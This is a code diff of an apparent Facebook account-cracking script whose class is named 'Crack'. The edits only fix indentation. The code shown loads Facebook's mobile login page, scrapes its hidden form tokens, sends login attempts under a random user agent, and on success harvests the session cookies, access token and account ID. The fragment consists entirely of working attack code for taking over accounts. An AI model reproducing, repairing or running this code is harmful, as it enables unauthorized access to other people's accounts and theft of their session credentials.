@@ -462,7 +462,8 @@ class Crack:
 				ua = random.choice(ugent)
 				ses = requests.Session()
 				link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
-                 params = {
+
+				params = {
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                     "try_number": "0",
@@ -483,8 +484,8 @@ class Crack:
                     "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                 
                  }
-                 headers = {
-                    "Host": "m.facebook.com",
+				headers = {
+					"Host": "m.facebook.com",
                     "content-length": f"{str(len(params))}",
                     "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                     "user-agent": ua,
@@ -499,7 +500,7 @@ class Crack:
                     "accept-encoding": "gzip, deflate",
                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                     }
-                 post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", params=params, headers=headers, allow_redirects=False)
+				post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
